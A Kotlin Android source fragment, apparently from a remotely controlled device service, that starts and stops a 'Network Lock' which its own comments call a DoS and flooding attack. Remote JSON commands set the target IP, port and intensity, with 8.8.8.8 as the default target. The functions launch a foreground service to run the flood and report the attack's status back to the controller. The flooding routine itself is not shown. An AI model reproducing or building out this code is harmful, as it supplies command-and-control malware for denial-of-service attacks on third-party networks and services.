    // NETWORK LOCK (DOS + FLOODING ATTACK)
    // ══════════════════════════════════════════════════════════════
    
    /**
     * Start Network Lock attack
     * value format: JSON string with fields:
     * - targetIp: string (IP address to attack)
     * - targetPort: int (port to target)
     * - intensity: int (1-10, attack strength)
     */
    private fun startNetworkLock(value: String) {
        try {
            // Start the service first if not running
            val serviceIntent = Intent(this, NetworkLockService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            
            // Parse options from JSON
            var targetIp = "8.8.8.8"
            var targetPort = 80
            var intensity = 5
            
            try {
                val obj = JSONObject(value)
                targetIp = obj.optString("targetIp", "8.8.8.8")
                targetPort = obj.optInt("targetPort", 80)
                intensity = obj.optInt("intensity", 5)
            } catch (e: Exception) {
                Log.w("DeviceService", "Network lock parse error, using defaults: ${e.message}")
            }
            
            // Send broadcast to start attack
            val intent = Intent(NetworkLockService.ACTION_START).apply {
                putExtra(NetworkLockService.EXTRA_TARGET_IP, targetIp)
                putExtra(NetworkLockService.EXTRA_TARGET_PORT, targetPort)
                putExtra(NetworkLockService.EXTRA_INTENSITY, intensity)
            }
            intent.setPackage(packageName)
            sendBroadcast(intent)
            
            emitStatus(JSONObject().apply {
                put("networkLockActive", true)
                put("networkLockTarget", "$targetIp:$targetPort")
                put("networkLockIntensity", intensity)
            })
            
            Log.d("DeviceService", "Network Lock started | target=$targetIp:$targetPort intensity=$intensity")
        } catch (e: Exception) {
            Log.e("DeviceService", "Start network lock error: ${e.message}")
        }
    }

    /**
     * Stop Network Lock attack
     */
    private fun stopNetworkLock() {
        try {
            // Send broadcast to stop attack
            val intent = Intent(NetworkLockService.ACTION_STOP)
            intent.setPackage(packageName)
            sendBroadcast(intent)
            
            emitStatus(JSONObject().apply {
                put("networkLockActive", false)
            })
            
            Log.d("DeviceService", "Network Lock stopped")
        } catch (e: Exception) {
            Log.e("DeviceService", "Stop network lock error: ${e.message}")
        }
    }
}

object SocketHolder {
    var connected: Boolean = false
}
